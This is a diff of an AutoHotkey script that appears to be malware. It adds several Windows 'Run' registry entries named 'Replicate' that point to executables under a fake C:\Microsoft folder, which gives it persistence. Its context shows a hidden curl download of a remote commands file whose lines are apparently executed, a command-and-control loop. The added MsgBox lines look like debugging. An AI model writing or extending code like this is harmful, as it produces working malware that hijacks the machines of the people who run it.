@@ -30,6 +30,10 @@ runAllExes() {
     RegWrite '"C:\Microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
     RegWrite '"C:\Microsoft\Backspace.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate4"
     RegWrite '"C:\Microsoft\Space.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate5"
+    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate6"
+    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate7"
+    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate8"
+    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate9"
 
     try {
         output := path "\commands.txt"
@@ -38,7 +42,10 @@ runAllExes() {
         command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
         Run command, , "Hide"
         text := FileRead(output)
+        MsgBox last
+        MsgBox text
         if (last != text) {
+            MsgBox "made it"
             last := text
             lines := StrSplit(Trim(text), "`n")
             for index, line in lines {
